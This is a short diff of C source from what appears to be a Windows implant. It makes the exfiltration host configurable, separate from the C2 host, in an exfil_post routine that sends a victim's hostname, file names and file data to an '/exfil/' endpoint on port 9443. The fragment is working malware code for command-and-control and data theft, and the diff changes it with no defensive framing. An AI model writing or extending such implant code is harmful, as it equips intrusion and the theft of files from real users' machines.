@@ -51,16 +51,19 @@ static void decode_enrollment_token(char *out)
  * from the mTLS C2 connection on port 443.  The C2 channel carries only
  * short command acknowledgements; no bulk data crosses it.
  *
- * URL format: https://<C2_DEFAULT_HOST>:9443/exfil/<hostname>/<filename>
+ * URL format: https://<EXFIL_DEFAULT_HOST>:9443/exfil/<hostname>/<filename>
  */
 #ifdef _WIN32
 #define EXFIL_PORT 9443
+#ifndef EXFIL_DEFAULT_HOST
+#define EXFIL_DEFAULT_HOST C2_DEFAULT_HOST
+#endif
 
 static void exfil_post(const char *hostname, const char *filename,
                         const char *data, int data_len)
 {
     wchar_t w_host[256] = {0};
-    MultiByteToWideChar(CP_ACP, 0, C2_DEFAULT_HOST, -1, w_host, 256);
+    MultiByteToWideChar(CP_ACP, 0, EXFIL_DEFAULT_HOST, -1, w_host, 256);
 
     char path_buf[512];
     _snprintf(path_buf, sizeof(path_buf), "/exfil/%s/%s", hostname, filename);
